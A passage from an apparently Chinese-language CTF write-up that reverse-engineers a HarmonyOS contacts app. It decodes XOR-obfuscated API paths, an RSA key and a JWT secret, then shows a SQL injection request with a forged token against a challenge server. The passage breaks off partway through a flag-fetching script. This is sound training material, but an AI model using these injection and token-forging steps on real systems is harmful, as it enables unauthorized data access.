        obj = ViewPU.#~@0=#UserList(Object2, Object3, ViewPU, ["setInitiallyProvidedValue", "&entry/src/main/ets/components/UserList&.#~@0>#setInitiallyProvidedValue", 1, "updateStateVars", "&entry/src/main/ets/components/UserList&.#~@0>#updateStateVars", 1, "purgeVariableDependenciesOnElmtId", "&entry/src/main/ets/components/UserList&.#~@0>#purgeVariableDependenciesOnElmtId", 1, "aboutToBeDeleted", "&entry/src/main/ets/components/UserList&.#~@0>#aboutToBeDeleted", 0, 4]);
        obj2 = obj.prototype;
        obj2["username"].getter = obj2.#~@0>#username;
        obj2["username"].setter = obj2.#~@0>#username^1;
        obj2.UserItem = obj2.#~@0>#UserItem;
        obj2.initialRender = obj2.#~@0>#initialRender;
        obj2.rerender = obj2.#~@0>#rerender;
        _module_0_ = obj;
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r17v0, types: [&entry/src/main/ets/components/UserList&] */
    /* JADX WARN: Type inference failed for: r24v24 */
    /* JADX WARN: Type inference failed for: r24v59, types: [int] */
    public Object #~@0=#UserList(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) {
        obj = arg3;
        obj2 = arg4;
        if ((0 == obj ? 1 : 0) != 0) {
            obj = -1;
        }
        if ((0 == obj2 ? 1 : 0) != 0) {
            obj2 = null;
        }
        obj3 = super(arg0, arg2, obj, arg5);
        if (("function" == typeof(obj2) ? 1 : 0) != 0) {
            obj3.paramsGenerator_ = obj2;
        }
        obj3.__username = ObservedPropertySimplePU("", obj3, "username");
        r24 = [Object];
        r24[0] = createobjectwithbuffer(["uid", "f47ac10b-58cc-4372-a567-0e02b2c3d479"]);
        r24[1] = createobjectwithbuffer(["uid", "c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b"]);
        r24[2] = createobjectwithbuffer(["uid", "732390b8-ccb6-41de-a93b-94ea059fd263"]);
        r24[3] = createobjectwithbuffer(["uid", "f633ec24-cfe6-42ba-bcd8-ad2dfae6d547"]);
        r24[4] = createobjectwithbuffer(["uid", "eb8991c8-9b6f-4bc8-89dd-af3576e92bdb"]);
        r24[5] = createobjectwithbuffer(["uid", "db62356d-3b99-4764-b378-e46cb95df9e6"]);
        r24[6] = createobjectwithbuffer(["uid", "8f4610ee-ee87-4cca-ad92-6cac4fdbe722"]);
        r24[7] = createobjectwithbuffer(["uid", "1678d80e-fd4d-4de3-aae2-cb0077f10c21"]);
        obj3.userList = r24;
        obj3.setInitiallyProvidedValue(arg1);
        obj3.finalizeConstruction();
        return obj3;
    }

    public Object #~@0>#UserItem(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1, Object arg2) {
        newlexenvwithname([3, "item", 0, "4newTarget", 1, "this", 2], 3);
        _lexenv_0_1_ = newTarget;
        _lexenv_0_2_ = this;
        _lexenv_0_0_ = arg0;
        if ((0 == arg2 ? 1 : 0) != 0) {
        }
        ldlexvar = _lexenv_0_2_;
        ldlexvar.observeComponentCreation2(#~@0>@1*#, Row);
        ldlexvar2 = _lexenv_0_2_;
        ldlexvar2.observeComponentCreation2(#~@0>@1*#^1, Image);
        ldlexvar3 = _lexenv_0_2_;
        ldlexvar3.observeComponentCreation2(#~@0>@1*#^2, Column);
        ldlexvar4 = _lexenv_0_2_;
        ldlexvar4.observeComponentCreation2(#~@0>@1*#^3, Text);
        Text.pop();
        Column.pop();
        Row.pop();
        return null;
    }

    public Object #~@0>#rerender(Object functionObject, Object newTarget, UserList this) {
        this.updateDirtyElements();
        return null;
    }

    public Object #~@0>#username(Object functionObject, Object newTarget, UserList this) {
        obj = this.__username;
        return obj.get();
    }

    public Object #~@0>@2*@3*@4*#(Object functionObject, Object newTarget, UserList this) {
        return null;
    }

    public Object #~@0>@2*@3*@5*#(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        Column.create();
        obj = Column.padding;
        obj2 = createobjectwithbuffer(["left", 0, "right", 0]);
        obj3 = createobjectwithbuffer(["id", 16777294, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj3.params = [Object];
        obj2.left = obj3;
        obj4 = createobjectwithbuffer(["id", 16777294, "type", 10002, "params", 0, "bundleName", "com.example.myapplication", "moduleName", "entry"]);
        obj4.params = [Object];
        obj2.right = obj4;
        obj(obj2);
        Column.onClick(#~@0>@2*@3*@5**#);
        return null;
    }

    public Object #~@0>#username^1(Object functionObject, Object newTarget, UserList this, Object arg0) {
        obj = this.__username;
        obj.set(arg0);
        return null;
    }

    public Object #~@0>@2*@3*@5**#(Object functionObject, Object newTarget, UserList this) {
        utils = import { default as utils } from "@normalized:N&&&entry/src/main/ets/common/Utils/utils&";
        utils.l1Lll1(_lexenv_0_1_.uid);
        return null;
    }

    /* JADX WARN: Type inference failed for: r16v24, types: [Object, java.lang.Class] */
    public Object #~@0>#initialRender(Object functionObject, Object newTarget, UserList this) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        ldlexvar = _lexenv_0_1_;
        ldlexvar.observeComponentCreation2(#~@0>@2*#, Column);
        ldlexvar2 = _lexenv_0_1_;
        ldlexvar2.observeComponentCreation2(#~@0>@2*#^1, List);
        LazyForEach.create("1", _lexenv_0_1_, import { UserDataSource } from "@normalized:N&&&entry/src/main/ets/viewmodel/UserDataSource&"(_lexenv_0_1_.userList), #~@0>@2*#__lazyForEachItemGenFunction, #~@0>@2*#__lazyForEachItemIdFunc);
        LazyForEach.pop();
        List.pop();
        Column.pop();
        return null;
    }

    public Object #~@0>#updateStateVars(Object functionObject, Object newTarget, UserList this, Object arg0) {
        return null;
    }

    public Object #~@0>#aboutToBeDeleted(Object functionObject, Object newTarget, UserList this) {
        obj = this.__username;
        obj.aboutToBeDeleted();
        Get = SubscriberManager.Get();
        Get.delete(this.id__());
        this.aboutToBeDeletedInternal();
        return null;
    }

    public Object #~@0>@2*@3*#itemCreation2(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        ListItem.create(#~@0>@2*@3*@4*#, 0);
        return null;
    }

    public Object #~@0>@2*@3*#observedDeepRender(Object functionObject, Object newTarget, UserList this) {
        ldlexvar = _lexenv_1_1_;
        ldlexvar.observeComponentCreation2(_lexenv_0_0_, ListItem);
        ldlexvar2 = _lexenv_1_1_;
        ldlexvar2.observeComponentCreation2(#~@0>@2*@3*@5*#, Column);
        obj = _lexenv_1_1_.UserItem;
        obj.bind(_lexenv_1_1_)(_lexenv_0_1_, _lexenv_0_2_);
        Column.pop();
        ListItem.pop();
        return null;
    }

    public Object #~@0>#setInitiallyProvidedValue(Object functionObject, Object newTarget, UserList this, Object arg0) {
        if ((0 != arg0.username ? 1 : 0) != 0) {
            this.username = arg0.username;
        }
        if ((0 != arg0.userList ? 1 : 0) == 0) {
            return null;
        }
        this.userList = arg0.userList;
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r15v5, types: [int] */
    /* JADX WARN: Type inference failed for: r15v7, types: [Object, int] */
    public Object #~@0>@2*#__lazyForEachItemIdFunc(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        return JSON.stringify(arg0) + arg1;
    }

    public Object #~@0>@2*#__lazyForEachItemGenFunction(Object functionObject, Object newTarget, UserList this, Object arg0, Object arg1) {
        newlexenvwithname([3, "itemCreation2", 0, "item", 1, "index", 2], 3);
        _lexenv_0_2_ = arg1;
        _lexenv_0_1_ = arg0;
        _lexenv_0_0_ = #~@0>@2*@3*#itemCreation2;
        #~@0>@2*@3*#observedDeepRender();
        return null;
    }

    public Object #~@0>#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, UserList this, Object arg0) {
        obj = this.__username;
        obj.purgeDependencyOnElmtId(arg0);
        return null;
    }
}
```

给出了设置的uid，引出`utils`

```java
package p001entry/src/main/ets/common/Utils;

/* renamed from: &entry/src/main/ets/common/Utils/utils&, reason: invalid class name */
/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */
public class utils {
    public Object pkgName@entry;
    public Object isCommonjs;
    public Object hasTopLevelAwait;
    public Object isSharedModule;
    public Object scopeNames;
    public Object moduleRecordIdx;

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r18v13, types: [int] */
    /* JADX WARN: Type inference failed for: r18v19, types: [int] */
    /* JADX WARN: Type inference failed for: r18v4, types: [Object, int] */
    public Object #~@0<@1*#(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        ldobjbyvalue = _lexenv_0_0_[arg1 % _lexenv_0_0_.length];
        return String.fromCharCode(arg0.charCodeAt(0) ^ ldobjbyvalue.charCodeAt(0));
    }

    /* JADX WARN: Type inference failed for: r20v4, types: [Object, java.lang.Class] */
    public Object #~@0<@2*#(Object functionObject, Object newTarget, utils this, Object arg0) {
        newlexenvwithname([2, "plainText", 0, "reslove", 1], 2);
        _lexenv_0_1_ = arg0;
        newobjrange = import { default as util } from "@ohos:util".Base64Helper();
        obj = createobjectwithbuffer(["data", 0]);
        obj.data = newobjrange.decodeSync(_lexenv_1_0_);
        obj2 = createobjectwithbuffer(["data", 0]);
        buffer = import { default as buffer } from "@ohos:buffer";
        obj2.data = Uint8Array(buffer.from(_lexenv_1_1_, "utf-8").buffer);
        _lexenv_0_0_ = obj2;
        cryptoFramework = import { default as cryptoFramework } from "@ohos:security.cryptoFramework";
        obj3 = cryptoFramework.createAsyKeyGenerator;
        ldlexvar = _lexenv_2_0_;
        callthisN = obj3(ldlexvar.oo0Oo0("c`u\u0007\u0002\u0006\t"));
        callthisN.convertKey(obj, 0, #~@0<@2**#);
        return null;
    }

    public Object #~@0<@3*#(Object functionObject, Object newTarget, utils this, Object arg0) {
        if ((import { default as http } from "@ohos:net.http".ResponseCode.OK == arg0.responseCode ? 1 : 0) == 0) {
            return null;
        }
        ldlexvar = _lexenv_1_0_;
        JSON = import { default as JSON } from "@ohos:util.json";
        obj = JSON.parse;
        obj2 = arg0.result;
        callthisN = obj(obj2.toString());
        ldlexvar.uuuuu = ((0 != callthisN ? 1 : 0) == 0 || (0 != callthisN ? 1 : 0) == 0) ? null : callthisN["data"]["users"][0]["name"];
        console.log(_lexenv_1_0_.uuuuu);
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    public Object #~@0<@4*#(Object functionObject, Object newTarget, utils this, Object arg0) {
        i = "{\"data\":\"" + arg0 + "\"}";
        ldlexvar = _lexenv_0_0_;
        obj = ldlexvar.request;
        ldlexvar2 = _lexenv_0_1_;
        obj2 = createobjectwithbuffer(["method", 0, "extraData", 0, "header", 0]);
        obj2.method = import { default as http } from "@ohos:net.http".RequestMethod.POST;
        obj2.extraData = i;
        obj3 = createobjectwithbuffer(["Authorization", 0, "X-Sign", 0, "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/ apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"]);
        ldlexvar3 = _lexenv_1_0_;
        obj4 = ldlexvar3.o0OO00O;
        ldlexvar4 = _lexenv_0_2_;
        ldlexvar5 = _lexenv_1_0_;
        obj3.Authorization = obj4(ldlexvar4, ldlexvar5.oo0Oo0(_lexenv_1_0_.Secret));
        CryptoJS = import { default as CryptoJS } from "@normalized:N&&&@ohos/crypto-js/index&2.0.0";
        MD5 = CryptoJS.MD5(i);
        obj3.X-Sign = MD5.toString();
        obj2.header = obj3;
        callthisN = obj(ldlexvar2, obj2);
        callthisN.then(#~@0<@4**#);
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    public Object #~@0<@2**#(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        if (isfalse(arg0) == null) {
        }
        ldlexvar = _lexenv_2_0_;
        RrrrRRR = ldlexvar.RrrrRRR(arg1.pubKey, _lexenv_0_0_);
        RrrrRRR.then(#~@0<@2***#);
        return null;
    }

    public Object #~@0<@4**#(Object functionObject, Object newTarget, utils this, Object arg0) {
        obj;
        obj2;
        if ((import { default as http } from "@ohos:net.http".ResponseCode.OK == arg0.responseCode ? 1 : 0) == 0) {
            promptAction = import { default as promptAction } from "@ohos:promptAction";
            obj3 = promptAction.showToast;
            obj4 = createobjectwithbuffer(["message", 0]);
            obj5 = arg0.result;
            obj4.message = obj5.toString();
            obj3(obj4);
            return null;
        }
        obj6 = console.log;
        JSON = import { default as JSON } from "@ohos:util.json";
        obj7 = JSON.parse;
        obj8 = arg0.result;
        callthisN = obj7(obj8.toString());
        if ((0 != callthisN ? 1 : 0) == 0 || (0 != callthisN ? 1 : 0) == 0) {
            obj = null;
        } else {
            ldlexvar = _lexenv_1_0_;
            obj = callthisN[ldlexvar.oo0Oo0("W_UR")];
        }
        obj6(obj);
        JSON2 = import { default as JSON } from "@ohos:util.json";
        obj9 = JSON2.parse;
        obj10 = arg0.result;
        callthisN2 = obj9(obj10.toString());
        if ((0 != callthisN2 ? 1 : 0) == 0 || (0 != callthisN2 ? 1 : 0) == 0) {
            obj2 = null;
        } else {
            ldlexvar2 = _lexenv_1_0_;
            obj2 = callthisN2[ldlexvar2.oo0Oo0("W_UR")];
        }
        obj11 = obj2;
        promptAction2 = import { default as promptAction } from "@ohos:promptAction";
        obj12 = promptAction2.showToast;
        obj13 = createobjectwithbuffer(["message", 0]);
        obj13.message = obj11;
        obj12(obj13);
        return null;
    }

    public Object #~@0<@2***#(Object functionObject, Object newTarget, utils this, Object arg0) {
        _lexenv_0_1_(arg0);
        return null;
    }

    public Object #~@0=#utils(Object functionObject, Object newTarget, utils this) {
        return this;
    }

    public Object func_main_0(Object functionObject, Object newTarget, utils this) {
        newlexenvwithname = newlexenvwithname([1, "utils", 0], 1);
        try {
            obj = hole.#~@0=#utils(Object2, Object3, hole, ["oo0Oo0", "&entry/src/main/ets/common/Utils/utils&.#~@0<#oo0Oo0", 1, "RrrrRRR", "&entry/src/main/ets/common/Utils/utils&.#~@0<#RrrrRRR", 2, "rRrrrRR", "&entry/src/main/ets/common/Utils/utils&.#~@0<#rRrrrRR", 2, "o0O0OOoo", "&entry/src/main/ets/common/Utils/utils&.#~@0<#o0O0OOoo", 1, "l1Lll1", "&entry/src/main/ets/common/Utils/utils&.#~@0<#l1Lll1", 1, "o0OO00O", "&entry/src/main/ets/common/Utils/utils&.#~@0<#o0OO00O", 2, 0]);
            _lexenv_0_0_ = obj;
            obj2 = obj.prototype;
            obj.#~@0>#static_initializer();
            newlexenvwithname = obj;
        } catch (ExceptionI0 unused) {
            poplexenv();
            throw(newlexenvwithname);
        }
        poplexenv();
        _module_0_ = newlexenvwithname;
        return null;
    }

    /* JADX WARN: Type inference failed for: r16v14, types: [int] */
    /* JADX WARN: Type inference failed for: r16v15, types: [Object, int] */
    /* JADX WARN: Type inference failed for: r16v7, types: [Object, int] */
    public Object #~@0<#l1Lll1(Object functionObject, Object newTarget, utils this, Object arg0) {
        newlexenvwithname([5, "req", 0, "url2", 1, "uuid", 2, "4newTarget", 3, "this", 4], 5);
        _lexenv_0_3_ = newTarget;
        _lexenv_0_4_ = this;
        _lexenv_0_2_ = arg0;
        i = "http://" + global.ip;
        ldlexvar = _lexenv_1_0_;
        _lexenv_0_1_ = (i + ldlexvar.oo0Oo0("\u001eRD\\\u001dD\u0000\u001dTTGRYSU"));
        http = import { default as http } from "@ohos:net.http";
        _lexenv_0_0_ = http.createHttp();
        ldlexvar2 = _lexenv_1_0_;
        oo0Oo0 = ldlexvar2.oo0Oo0("|z}w{Xp|qVXE]Y[v\u000bD\u0001qudwtps|rre\rs\u007fx{qrT\u007fvscts\u0005ykF\u0004~a~J\u0001@\n\u0003YaD\u0001B\u0004K9\\DFUH\u001dyFDc[Fw\u0006\u0001guxsxaJ\u0007h\u0006]aGqGd[p[Dtd|\u0002\u0007\u0001dXYG}RPsAB~\u0005K@F|ZFYtW|\u007f?A\u0006~aG\u0006cN}dKV^XVDl\u0002j\u0002\u0005Cukxzzkkua\u0005d^\u001fRhP\u0004jkFZe\ruQwCUtYV~P~[DVVfc@@8y\u0006@G\u0000{Ea{{}ZeX\\xhCrYU~gaM~t\u0000\u0019^Fup\u007fdF\u0004q|`q\u001bS@tAA\u001cd\u0006\u001fzAB[\u007ftpeSz`P_8\n\bfAL\u000bykAt`Dl\u0007W\u0019\u007fDExr@y|Sf\u0003_HPd\u0005jf`[k_[Y\u001eY\u0003\u001aU\u000b|tg\u0005\u0003fAgiEDAw@vdsD;x\u001b\\|PrubUxe\u0002\u0005x\u001eVv~\u0000mrkzzww\u0003d\u007fXsBuur\u0001_zb]G\u0006\u0004\u000bu\u0003PvzJ~EfdDs|cE\u001eqp\u0000@>aE{usbpq");
        ldlexvar3 = _lexenv_1_0_;
        oo0Oo02 = ldlexvar3.oo0Oo0("J\u0011UVF[^\\\u0011\u000b\u0011SPFT]ST\u0013N");
        ldlexvar4 = _lexenv_1_0_;
        rRrrrRR = ldlexvar4.rRrrrRR(oo0Oo02, oo0Oo0);
        rRrrrRR.then(#~@0<@4*#);
        return "";
    }

    public Object #~@0<#oo0Oo0(Object functionObject, Object newTarget, utils this, Object arg0) {
        newlexenvwithname([3, "keyChars", 0, "4newTarget", 1, "this", 2], 3);
        _lexenv_0_1_ = newTarget;
        _lexenv_0_2_ = this;
        from = Array.from(arg0);
        _lexenv_0_0_ = Array.from("134522123");
        map = from.map(#~@0<@1*#);
        return map.join("");
    }

    /* JADX WARN: Type inference failed for: r20v16, types: [Object, java.lang.Class] */
    public Object #~@0<#RrrrRRR(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        asyncfunctionenter = asyncfunctionenter();
        try {
            cryptoFramework = import { default as cryptoFramework } from "@ohos:security.cryptoFramework";
            obj = cryptoFramework.createCipher;
            ldlexvar = _lexenv_0_0_;
            callthisN = obj(ldlexvar.oo0Oo0("c`u\u0007\u0002\u0006\tNczpg\u0004"));
            newobjrange = import { default as util } from "@ohos:util".Base64Helper();
            suspendgenerator(asyncfunctionenter, asyncfunctionawaituncaught(asyncfunctionenter, callthisN.init(import { default as cryptoFramework } from "@ohos:security.cryptoFramework".CryptoMode.ENCRYPT_MODE, arg0, 0)));
            resumegenerator = resumegenerator(asyncfunctionenter);
            if ((1 == getresumemode(asyncfunctionenter) ? 1 : 0) != 0) {
                throw(resumegenerator);
            }
            suspendgenerator(asyncfunctionenter, asyncfunctionawaituncaught(asyncfunctionenter, callthisN.doFinal(arg1)));
            resumegenerator2 = resumegenerator(asyncfunctionenter);
            if ((1 == getresumemode(asyncfunctionenter) ? 1 : 0) != 0) {
                throw(resumegenerator2);
            }
            asyncfunctionenter = asyncfunctionresolve(newobjrange.encodeToStringSync(resumegenerator2.data), asyncfunctionenter);
            return asyncfunctionenter;
        } catch (ExceptionI0 unused) {
            return asyncfunctionreject(asyncfunctionenter, asyncfunctionenter);
        }
    }

    public Object #~@0<#o0OO00O(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        jwt = import { default as jwt } from "@normalized:N&&&@ohos/jsonwebtoken/index&1.0.1";
        obj = jwt.sign;
        obj2 = createobjectwithbuffer(["sub", "1234567890", "uid", 0, "iat", 1516239022]);
        obj2.uid = arg0;
        return obj(obj2, arg1);
    }

    public Object #~@0<#rRrrrRR(Object functionObject, Object newTarget, utils this, Object arg0, Object arg1) {
        newlexenvwithname([4, "pk", 0, "message", 1, "4newTarget", 2, "this", 3], 4);
        _lexenv_0_2_ = newTarget;
        _lexenv_0_3_ = this;
        _lexenv_0_1_ = arg0;
        _lexenv_0_0_ = arg1;
        return Promise(#~@0<@2*#);
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r24v13, types: [int] */
    /* JADX WARN: Type inference failed for: r24v6, types: [Object, int] */
    public Object #~@0<#o0O0OOoo(Object functionObject, Object newTarget, utils this, Object arg0) {
        newlexenvwithname([2, "4newTarget", 0, "this", 1], 2);
        _lexenv_0_0_ = newTarget;
        _lexenv_0_1_ = this;
        i = "http://" + global.ip;
        ldlexvar = _lexenv_1_0_;
        oo0Oo0 = i + ldlexvar.oo0Oo0("\u001eRD\\\u001dD\u0000\u001dP^]@TQFB\rFXW\t") + arg0;
        http = import { default as http } from "@ohos:net.http";
        createHttp = http.createHttp();
        obj = createHttp.request;
        obj2 = createobjectwithbuffer(["method", 0, "header", 0]);
        obj2.method = import { default as http } from "@ohos:net.http".RequestMethod.GET;
        obj3 = createobjectwithbuffer(["Authorization", 0]);
        ldlexvar2 = _lexenv_1_0_;
        obj4 = ldlexvar2.o0OO00O;
        ldlexvar3 = _lexenv_1_0_;
        obj3.Authorization = obj4(arg0, ldlexvar3.oo0Oo0(_lexenv_1_0_.Secret));
        obj2.header = obj3;
        callthisN = obj(oo0Oo0, obj2);
        callthisN.then(#~@0<@3*#);
        return "";
    }

    public Object #~@0>#static_initializer(Object functionObject, Object newTarget, utils this) {
        this.Secret = "FpBz\u0001ecH\n\u001bEzx\u0017@|SrAXQGkloXz\u0007ElXZ";
        this.uuuuu = "";
        return null;
    }
}
```

得出几段密文信息，写出解密脚本

```python
def decrypt_path(encrypted_str, key):
    decrypted = []
    key_repeated = (key * (len(encrypted_str) // len(key) + 1))[:len(encrypted_str)]
    for i, char in enumerate(encrypted_str):
        dec_char = ord(char) ^ ord(key_repeated[i])
        decrypted.append(chr(dec_char))
    return ''.join(decrypted)

encrypted = "\u001eRD\\\u001dD\u0000\u001dTTGRYSU"
key = "134522123"
path = decrypt_path(encrypted, key)
print(path)
```

```
\u001eRD\\\u001dD\u0000\u001dP^]@TQFB\rFXW\t
/api/v1/contacts?uid=


\u001eRD\\\u001dD\u0000\u001dTTGRYSU
/api/v1/getflag


J\u0011UVF[^\\\u0011\u000b\u0011SPFT]ST\u0013N
{"action":"getflag"}

c`u\u0007\u0002\u0006\tNczpg\u0004
RSA2048|PKCS1

W_UR
flag
```

并且也给出了RSA公钥

```python
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_der_public_key


def decrypt_string(encrypted_str, key="134522123"):
    """解密字符串 - 模拟utils.oo0Oo0方法"""
    key_chars = list(key)
    result = ""

    for i, char in enumerate(encrypted_str):
        key_char = key_chars[i % len(key_chars)]
        decrypted_char = chr(ord(char) ^ ord(key_char))
        result += decrypted_char

    return result


def extract_rsa_public_key():
    """提取和解析RSA公钥"""
    # 🎯 从utils类中提取的长加密字符串
    encrypted_key = """|z}w{Xp|qVXE]Y[v\x0bD\x01qudwtps|rre\rs\x7fx{qrT\x7fvscts\x05ykF\x04~a~J\x01@\n\x03YaD\x01B\x04K9\\DFUH\x1dyFDc[Fw\x06\x01guxsxaJ\x07h\x06]aGqGd[p[Dtd|\x02\x07\x01dXYG}RPsAB~\x05K@F|ZFYtW|\x7f?A\x06~aG\x06cN}dKV^XVDl\x02j\x02\x05Cukxzzkkua\x05d^\x1fRhP\x04jkFZe\ruQwCUtYV~P~[DVVfc@@8y\x06@G\x00{Ea{{}ZeX\\xhCrYU~gaM~t\x00\x19^Fup\x7fdF\x04q|`q\x1bS@tAA\x1cd\x06\x1fzAB[\x7ftpeSz`P_8\n\x08fAL\x0bykAt`Dl\x07W\x19\x7fDExr@y|Sf\x03_HPd\x05jf`[k_[Y\x1eY\x03\x1aU\x0b|tg\x05\x03fAgiEDAw@vdsD;x\x1b\\|PrubUxe\x02\x05x\x1eVv~\x00mrkzzww\x03d\x7fXsBuur\x01_zb]G\x06\x04\x0bu\x03PvzJ~EfdDs|cE\x1eqp\x00@>aE{usbpq"""

    print("🔍 开始解密RSA公钥...")
    print(f"📝 加密字符串长度: {len(encrypted_key)}")

    # 步骤1: 使用XOR解密
    decrypted_key = decrypt_string(encrypted_key)
    print(f"✅ XOR解密完成，长度: {len(decrypted_key)}")
    print(f"📄 解密结果预览: {decrypted_key[:100]}...")

    try:
        # 步骤2: Base64解码
        public_key_der = base64.b64decode(decrypted_key)
        print(f"✅ Base64解码完成，二进制长度: {len(public_key_der)}")

        # 步骤3: 解析DER格式的公钥
        public_key = load_der_public_key(public_key_der)
        print("✅ RSA公钥解析成功！")

        # 输出公钥信息
        key_size = public_key.key_size
        public_numbers = public_key.public_numbers()

        print("\n📊 RSA公钥信息:")
        print(f"🔑 密钥长度: {key_size} bits")
        print(f"🔢 公钥指数 (e): {public_numbers.e}")
        print(f"🔢 模数 (n): {hex(public_numbers.n)[:50]}...")

        # 转换为PEM格式便于使用
        pem_key = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        print("\n📋 PEM格式公钥:")
        print(pem_key.decode())

        return {
            "key_object": public_key,
            "pem": pem_key.decode(),
            "der": public_key_der,
            "key_size": key_size,
            "exponent": public_numbers.e,
            "modulus": public_numbers.n
        }

    except Exception as e:
        print(f"❌ 解析公钥失败: {str(e)}")
        print(f"🔍 解密后的字符串: {repr(decrypted_key)}")
        return None


def test_rsa_encryption(public_key_info):
    """测试RSA加密功能"""
    if not public_key_info:
        return

    try:
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding

        # 测试加密 {"action":"getflag"}
        message = '{"action":"getflag"}'.encode()
        public_key = public_key_info["key_object"]

        encrypted = public_key.encrypt(
            message,
            padding.PKCS1v15()
        )

        encrypted_b64 = base64.b64encode(encrypted).decode()

        print("\n🧪 RSA加密测试:")
        print(f"📝 原始消息: {message.decode()}")
        print(f"🔐 加密结果(Base64): {encrypted_b64[:100]}...")
        print(f"📏 加密长度: {len(encrypted_b64)}")

        return encrypted_b64

    except Exception as e:
        print(f"❌ RSA加密测试失败: {str(e)}")
        return None


if __name__ == "__main__":
    print("🚀 RSA公钥提取工具")
    print("=" * 60)

    # 提取公钥
    key_info = extract_rsa_public_key()

    if key_info:
        # 测试加密
        encrypted_msg = test_rsa_encryption(key_info)

        print("\n💡 使用建议:")
        print("1. 保存PEM格式的公钥到文件")
        print("2. 使用该公钥加密 '{\"action\":\"getflag\"}' 消息")
        print("3. 将加密结果Base64编码后作为请求体发送")
    else:
        print("\n❌ 公钥提取失败，可能需要调整解密逻辑")
```

得到

```pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z
hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK
s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur
H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn
99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw
K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s
TwIDAQAB
-----END PUBLIC KEY-----
```

```
f47ac10b-58cc-4372-a567-0e02b2c3d479
c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b
732390b8-ccb6-41de-a93b-94ea059fd263
f633ec24-cfe6-42ba-bcd8-ad2dfae6d547
eb8991c8-9b6f-4bc8-89dd-af3576e92bdb
db62356d-3b99-4764-b378-e46cb95df9e6
8f4610ee-ee87-4cca-ad92-6cac4fdbe722
1678d80e-fd4d-4de3-aae2-cb0077f10c21
```

经过长久测试发现sql注入

```http
GET /api/v1/contacts?uid="!=" HTTP/1.1
Host: 47.96.162.115:8080
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidWlkIjoiOGY0NjEwZWUtZWU4Ny00Y2NhLWFkOTItNmNhYzRmZGJlNzIyIiwiaWF0IjoxNzQ5MzY0ODA4fQ.8hvBEM4jvKqlMXmVoYtechEGFid1a_S6otobnZ5sCvk


```

![1](QQ20250608-160919.jpg)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import jwt
import hashlib
import json
import base64
import requests
import time
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization


def get_flag():
    # 配置参数
    SERVER_IP = "web-722d04cf71.challenge.xctf.org.cn"
    TARGET_UID = "9d5ec98c-5848-4450-9e58-9f97b6b3b7bc"
    SECRET = "wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh"

    # RSA公钥
    RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z
hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK
s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur
H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn
99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw
K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s
TwIDAQAB
-----END PUBLIC KEY-----"""

    print("🚀 开始获取Flag...")
    print("=" * 60)
    print(f"🎯 目标服务器: {SERVER_IP}")
    print(f"🔑 使用UUID: {TARGET_UID}")

    # 1. 加载RSA公钥
    try:
        public_key = serialization.load_pem_public_key(RSA_PUBLIC_KEY.encode())
        print("✅ RSA公钥加载成功")
    except Exception as e:
        print(f"❌ RSA公钥加载失败: {e}")
        return None
